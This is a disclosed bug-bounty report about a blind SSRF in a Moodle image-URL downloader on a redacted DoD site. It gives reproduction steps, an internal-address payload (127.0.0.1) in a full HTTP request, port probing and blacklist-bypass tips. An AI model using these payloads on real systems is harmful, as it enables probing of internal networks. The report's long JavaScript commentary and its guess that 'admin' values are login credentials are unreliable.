---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/server-side-request-forgery-ssrf
  - env/web
  - vuln/ssrf
  - vuln/command-injection
  - vuln/cors-misconfig
  - trigger/auth-required
  - trigger/cors-origin
  - fix/input-validation
substate: "resolved"
weakness: "Server-Side Request Forgery (SSRF)"
enriched: true
body: true
date: 2022-10-14
submitted: 2022-09-05T14:26:08.852Z
bounty_usd: null
votes: 14
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "696e746c6f6c"
source: "https://hackerone.com/reports/1691501"
title: "Blind SSRF via image upload URL downloader on https://██████/ "
---
# Blind SSRF via image upload URL downloader on https://██████/ 

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 14 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2022-10-14

- Report: [https://hackerone.com/reports/1691501](https://hackerone.com/reports/1691501)
- CWE: Server-Side Request Forgery (SSRF)
- Submitted: 2022-09-05T14:26:08.852Z

## Report summary

```javascript
$.urlParam = function(name){
    var results = new RegExp('[\?&]' + name + '=([^&#]*)').exec(window.location.href);
    if (results==null){
       return null;
    }
    else{
       return decodeURI(results[1]) || 0;
    }
}
```

```javascript
var results = new RegExp('[\?&]' + name + '=([^&#]*)').exec(window.location.href);
```
So, variable results are declared with var keyword. Which means it stores new RegExp and actually RegExp object is using ('[\?&]' but I recommend using =(.+?(?:&|$))') Since The ?! n quantifier matches any string that is not followed by a specific string n. And [] denotes a character class. () denotes a capturing group. [a-z0-9] -- One character that is in the range of a-z OR 0-9. And it's using The exec() method which means it's testing a match in a string. exec(window.location.href) this will just return the URL of the current page. It's using If statement, If the results are equal to null which means it's testing whether the value of a variable results is the null value. And  
```javascript
if (results==null){
       return null;
    } 
```
This code means if results are equal to null which means it's testing whether the value of a variable results is the null value and if the variable results are the null value then it will return null. So basically return null means that  that the expected object couldn't be created. Because we found a variable that returns null. 
```javascript
  else{
       return decodeURI(results[1]) || 0;
    }
}
```
Or else if the code is not executed which means if statement failed then it will return decodeURI() method that decodes a URI.
I saw that regex that you are using for me is not great at all. I would like to recommend to make a good allow-list in a nutshell whitelist with a good regex. So it would be impossible to bypass protection to gain SSRF. Use regex and unicode chars like this:
```javascript
const text = 'haxorman';
const regex = /[\u0400-\u04FF]+/g;
```
\w and \W only matches ASCII based characters; for example, a to z, A to Z, 0 to 9, and. Just suggestion. Or use regex with sticky flag. Also open redirection is possible via image URL downloader. It actually downloads google background image. What if an attacker is able to manipulate victim into downloading some malicious URL.  And I'm not sure is this real or no:
```javascript
M.cfg = {"wwwroot":"https:\/\/███","sesskey":"lkrZzDv8WH","sessiontimeout":"7200","themerev":"1662685982","slasharguments":1,"theme":"adaptable","iconsystemmodule":"core\/icon_system_fontawesome","jsrev":"1662685982","admin":"admin","svgicons":true,"usertimezone":"America\/New_York","contextid":9398501,"langrev":1662685982,"templaterev":"1662685982"};var yui1ConfigFn = function(me) {if(/-skin|reset|fonts|grids|base/.test(me.name)){me.type='css';me.path=me.path.replace(/\.js/,'.css');me.path=me.path.replace(/\/yui2-skin/,'/assets/skins/sam/yui2-skin')}};
```
Notice admin and admin. I think that's username and password. For admin let's take a look:
```javascript
window.onload = function(){
    if(window.location.pathname == '/admin/user.php'){
        const urlParams = new URLSearchParams(window.location.search);
        const showmore = urlParams.get('showmore');
        if(showmore == 'true'){
            document.getElementsByClassName('moreless-toggler')[0].click();
        }
    }
};
```
So, it's using windoww.onload function. onload event will react when an object has been loaded. Next thing is  
```javascript
  if(window.location.pathname == '/admin/user.php'){
        const urlParams = new URLSearchParams(window.location.search);
        const showmore = urlParams.get('showmore');
        if(showmore == 'true'){
            document.getElementsByClassName('moreless-toggler')[0].click();
        }
    }
};
```
So, window.location.pathname returns the path and filename of the page which means it returns /admin/user.php which is bad. User could bypass this by many ways and access admin login page. And use admin and admin creds to login in.  Then it's using const urlParams = new URLSearchParams(window.location.search); for a case when you need all query parameters. URLSearchParams is an iterable object. And the value of window.location.search is example: ?haxor=1337. Then         const showmore = urlParams.get('showmore'); It's using get parameter 'showmore'. 
```javascript
  if(showmore == 'true'){
            document.getElementsByClassName('moreless-toggler')[0].click();
        }
    }
};
```
If showmore is equal to true and then  document.getElementsByClassName('moreless-toggler')[0].click(); and then it will click only on first element with class 'moreless-toggler'. Basically The getElementsByClassName() method returns a collection of elements with a specified class names



Follow me on twitter if you want! 

https://twitter.com/0x1int

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Description:**
Dear DoD,

I found Blind SSRF on one domain from Hack US program.  Original domain is https://█████/ but when you make account and login it redirects you to https://███/my/. Here's the video PoC:

██████


Thank you!

## Impact

In a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization's infrastructure. In other cases, they may be able to force the server to connect to arbitrary external systems, potentially leaking sensitive data such as authorization credentials. The attack can often result in unauthorized actions or access to data within the organization, either in the vulnerable application itself or on other back-end systems that the application can communicate with. In some situations, the SSRF vulnerability might allow an attacker to perform arbitrary command execution.

## System Host(s)
███████

## Affected Product(s) and Version(s)
Web App is infected.

## CVE Numbers


## Steps to Reproduce
1. Create a one test account.
2. Login to that account.
3. Go to edit profile.
4. Scroll down there.
5. Notice user picture field.
6. Try to upload something.
7. You will see URL downloader.
8. Open your burp collaborator client.
9. Copy and paste the payload in URL downloader, make sure to include /test.png at the ending like this http://example.com/test.png
10. Poll now in burp collaborator client.
11. Notice HTTP and DNS interaction. IP address from HTTP interaction is from internal network which means
we can do some middleware issues. Notice that it's fetching test.png file. And IP is from internal network.
12. Turn your foxy proxy on and open your burp suite.
13. Paste this ipv4 in URL downloader: http://127.0.0.1/test.png
14. Intercept request. Request should look like this:
```javascript
POST /repository/repository_ajax.php?action=signin HTTP/1.1
Host: █████████
Cookie: MoodleSession=c5416a0e3ea3db1606b2876b0b6ac35f; RedirectDouble=1; MOODLEID1_=%25BA%2519V%25E8%25DA%2517
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: */*
Accept-Language: hr,hr-HR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 295
Origin: https://███████
Referer: https://█████/user/edit.php
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

file=http%3A%2F%2F127.0.0.1%2Ftest.png&repo_id=5&p=&page=&env=filemanager&accepted_types[]=.gif&accepted_types[]=.jpe&accepted_types[]=.jpeg&accepted_types[]=.jpg&accepted_types[]=.png&sesskey=h2ixtMF4Fv&client_id=6315fe93ef054&itemid=951353609&maxbytes=1073741824&areamaxbytes=-1&ctx_id=9398501
```
15. You will notice one error showing some info about server which confirms Blind SSRF again. The response looks like this:
```javascript
HTTP/1.1 200 OK
Server: nginx
Date: Mon, 05 Sep 2022 14:05:32 GMT
Content-Type: application/json; charset=utf-8
Connection: close
X-Powered-By: PHP/7.4.28
Set-Cookie: RedirectDouble=1; path=/
Set-Cookie: RedirectDouble=1; path=/
Set-Cookie: RedirectDouble=1; path=/
Set-Cookie: RedirectDouble=1; path=/
Cache-Control: no-store, no-cache, must-revalidate
Cache-Control: post-check=0, pre-check=0
Pragma: no-cache
Expires: Mon, 20 Aug 1969 09:23:00 GMT
Last-Modified: Mon, 05 Sep 2022 14:05:32 GMT
Accept-Ranges: none
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Length: 261

{"list":[],"nosearch":true,"norefresh":true,"nologin":true,"error":"HTTP\/1.1 404 Not Found\r\nServer: nginx\r\nDate: Mon, 05 Sep 2022 14:05:32 GMT\r\nContent-Type: text\/html; charset=utf-8\r\nContent-Length: 146\r\nConnection: keep-alive\r\n\r\n","repo_id":5
```
16. By the way if you change to 25 port its leaking something about Postfix SMTP server. 
17. Also I was able to identify that your web app is using libcurl.

## Suggested Mitigation/Remediation Actions
My suggestion is to create whitelisted domains in DNS
The easiest way to remediate SSRF is to whitelist any domain or address that your application accesses.
Blacklisting and regex have the same issue, someone will eventually find a way to exploit them
Do Not Send Raw Responses. Do not use blacklists. use whitelists (allow-lists)
Never send a raw response body from the server to the client. Responses that the client receives need to be expected.
Enforce URL Schemas. Allow only URL schemas that your application uses. There is no need to have ftp://, file:/// or even http:// enabled if you only use https://. And if you do use other schemas make sure that they’re only accessible from the part that needs to access them and not from anywhere else.
Enable Authentication on All Services. Make sure that authentication is enabled on any service that is running inside your network even if they don’t require it. Services like memcached, redis, mongo and others don’t require authentication for normal operations, but this means they can be exploited.
Sanitize and Validate Inputs. Never trust user input. Always sanitize any input that the user sends to your application. Remove bad characters, standardize input (double quotes instead of single quotes for example).After sanitization make sure to validate sanitized input to make sure nothing bad passed through.
Why is it Ineffective to Blacklist Domains and IPs? Understanding SSRF Bypass
One way to protect against SSRF is to blacklist certain domains and IP addresses. This defense technique is not effective, because hackers can use bypasses to avoid your security measures. Below are a few simple ways attackers can bypass blacklists.
Bypassing Blacklists Using HTTPS. Common blacklists blocking everything on port 80 or the http scheme. but the server will handle requests to 443 or https just fine. Instead of using http://127.0.0.1/ use: https://127.0.0.1/ https://localhost/
Or create SSRF protection with Bright.

## Timeline

- **Report Filed**
- **Report Severity Updated**
- **Report Triaged**
- **2022-09-06** @696e746c6f6c: Hey,

Thank you  so much.

Have a best day!
- **2022-09-07** @696e746c6f6c: Gonna log out from HackerOne for few days.██████

Thank you!
- **2022-09-11** @696e746c6f6c: Hey,

I was playing around with Blind SSRF and actually I noticed this in source code:
Since I couldn't access another ipv4 because it supports only 127.0.0.1 ipv4. And response status is actually 200 OK not 500 unexpected. But RTT returns 30010ms which means it is firewalled or unable to route traffic to server.

█████

```javascript
$.urlParam = function(name){
    var results = new RegExp('[\?&]' + name + '=([^&#]*)').exec(window.location.href);
    if (results==null){
       return null;
    }
    else{
       return decodeURI(results[1]) || 0;
    }
}
```

```javascript
var results = new RegExp('[\?&]' + name + '=([^&#]*)').exec(window.location.href);
```
So, variable results are declared with var keyword. Which means it stores new RegExp and actually RegExp object is using ('[\?&]' but I recommend using =(.+?(?:&|$))') Since The ?! n quantifier matches any string that is not followed by a specific string n. And [] denotes a character class. () denotes a capturing group. [a-z0-9] -- One character that is in the range of a-z OR 0-9. And it's using The exec() method which means it's testing a match in a string. exec(window.location.href) this will just return the URL of the current page. It's using If statement, If the results are equal to null which means it's testing whether the value of a variable results is the null value. And  

```javascript
if (results==null){
       return null;
    } 
````
This code means if results are equal to null which means it's testing whether the value of a variable results is the null value and if the variable results are the null value then it will return null. So basically return null means that  that the expected object couldn't be created. Because we found a variable that returns null. 
```javascript
  else{
       return decodeURI(results[1]) || 0;
    }
}
````
Or else if the code is not executed which means if statement failed then it will return decodeURI() method that decodes a URI.

I saw that regex that you are using for me is not great at all. I would like to recommend to make a good allow-list in a nutshell whitelist with a good regex. So it would be impossible to bypass protection to gain SSRF. Use regex and unicode chars like this:

```javascript
const text = 'haxorman';
const regex = /[\u0400-\u04FF]+/g;
```
\w and \W only matches ASCII based characters; for example, a to z, A to Z, 0 to 9, and. Just suggestion. Or use regex with sticky flag. Also open redirection is possible via image URL downloader. It actually downloads google background image. What if an attacker is able to manipulate victim into downloading some malicious URL.  And I'm not sure is this real or no:
```javascript
M.cfg = {"wwwroot":"https:\/\/██████████","sesskey":"lkrZzDv8WH","sessiontimeout":"7200","themerev":"1662685982","slasharguments":1,"theme":"adaptable","iconsystemmodule":"core\/icon_system_fontawesome","jsrev":"1662685982","admin":"admin","svgicons":true,"usertimezone":"America\/New_York","contextid":9398501,"langrev":1662685982,"templaterev":"1662685982"};var yui1ConfigFn = function(me) {if(/-skin|reset|fonts|grids|base/.test(me.name)){me.type='css';me.path=me.path.replace(/\.js/,'.css');me.path=me.path.replace(/\/yui2-skin/,'/assets/skins/sam/yui2-skin')}};
```
Notice admin and admin. I think that's username and password. For admin let's take a look:
```javascript
window.onload = function(){
    if(window.location.pathname == '/admin/user.php'){
        const urlParams = new URLSearchParams(window.location.search);
        const showmore = urlParams.get('showmore');
        if(showmore == 'true'){
            document.getElementsByClassName('moreless-toggler')[0].click();
        }
    }
};
````
So, it's using windoww.onload function. onload event will react when an object has been loaded. Next thing is  
```javascript
  if(window.location.pathname == '/admin/user.php'){
        const urlParams = new URLSearchParams(window.location.search);
        const showmore = urlParams.get('showmore');
        if(showmore == 'true'){
            document.getElementsByClassName('moreless-toggler')[0].click();
        }
    }
};
```
So, window.location.pathname returns the path and filename of the page which means it returns /admin/user.php which is bad. User could bypass this by many ways and access admin login page. And use admin and admin creds to login in.  Then it's using const urlParams = new URLSearchParams(window.location.search); for a case when you need all query parameters. URLSearchParams is an iterable object. And the value of window.location.search is example: ?haxor=1337. Then         const showmore = urlParams.get('showmore'); It's using get parameter 'showmore'. 
```javascript
  if(showmore == 'true'){
            document.getElementsByClassName('moreless-toggler')[0].click();
        }
    }
};
```
If showmore is equal to true and then  document.getElementsByClassName('moreless-toggler')[0].click(); and then it will click only on first element with class 'moreless-toggler'. Basically The getElementsByClassName() method returns a collection of elements with a specified class names
- **2022-09-11** @696e746c6f6c: I think I was clear. From Blind SSRF to source code analysis ==> talking about Regex for whitelist, from Regex ==> to discovering admin panel ==> information disclosure.
- **Report Resolved**
- **2022-09-19** @696e746c6f6c: Can we disclose this report?
- **2022-09-19** @696e746c6f6c: So, everyone will be able to see this report.
- **2022-09-19** @agent-z1: @0x1int

You can request disclosure from the H1 options on the report.  The report will be reviewed and sensitive information redacted before publishing.

Regards,
The VDP Team
- **2022-09-19** @696e746c6f6c: But where is that option haha? I don't really see that option.
- **Agreed On Going Public**
- **2022-09-19** @696e746c6f6c: Oh now I see that. Thank you!

King regards,
0x1int
- **2022-09-19** @696e746c6f6c: Also are you gonna disclose this report right now or?
- **2022-09-26** @696e746c6f6c: Greetings @agent-z1 @marmelade321,

How are you? My report is pending on disclosure for 7 days. Can we disclose this?

Thank you!
- **2022-09-27** @ag3nt-j1: @0x1int we usually do disclosure requests on Friday. We've been busy but will get this done this Friday or next Friday for sure.
- **2022-09-27** @696e746c6f6c: Alright thank you lads!

Have a great day and weekend when it comes!
- **2022-10-07** @696e746c6f6c: Greetings,

@ag3nt-j1 @agent-z1 @marmelade321 @agent-p1

Anything? Been like two weeks and today report was supposed to be disclosed?

Thank you!
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
